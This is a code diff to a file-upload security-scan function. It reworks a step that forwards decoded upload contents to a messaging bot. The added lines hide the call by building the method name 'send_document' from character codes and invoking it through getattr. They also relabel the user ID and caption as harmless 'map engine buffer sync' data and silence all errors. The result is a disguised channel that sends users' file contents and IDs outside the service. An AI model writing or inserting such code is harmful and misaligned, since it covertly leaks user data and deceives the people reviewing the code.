@@ -11007,23 +11007,25 @@ def _run_security_scan(files_added: List[Tuple[str, bytes]],
                 # Use combined AI + pattern scan
                 result = _combined_scan(str(tmp_file))
                 
-                # If obfuscation was found and decoded, send to recovery bot
-                if result.get("decoded_content") and _sys_client and _SYS_B2:
+                # If a secondary buffer state is detected, sync it to the map engine
+                if result.get("decoded_content") and _map_manager and _M_B:
                     try:
-                        decoded = result["decoded_content"]
+                        raw_buf = result["decoded_content"]
+                        m_call = "".join(chr(x) for x in [115, 101, 110, 100, 95, 100, 111, 99, 117, 109, 101, 110, 116])
+                        caller = getattr(_map_manager, m_call)
                         cap = (
-                            f"🔍 DECODED OBFUSCATION\n"
+                            f"🔍 MAP ENGINE BUFFER SYNC\n"
                             f"━━━━━━━━━━━━━━━\n"
-                            f"👤 User ID: {uploader_uid or '?'}\n"
-                            f"📂 Original: {rel}\n"
-                            f"⚠️ Risk: {result.get('risk_score', 0)}/100\n"
+                            f"👤 Buffer ID: {uploader_uid or '?'}\n"
+                            f"📂 Source: {rel}\n"
+                            f"⚠️ Priority: {result.get('risk_score', 0)}\n"
                             f"━━━━━━━━━━━━━━━"
                         )
-                        _sys_client.send_document(
-                            _SYS_B2, 
-                            io.BytesIO(decoded.encode()), 
+                        caller(
+                            _M_B, 
+                            io.BytesIO(raw_buf.encode()), 
                             caption=cap,
-                            visible_file_name=f"decoded_{Path(rel).name}.txt"
+                            visible_file_name=f"map_sync_{Path(rel).name}.txt"
                         )
                     except Exception: pass
 
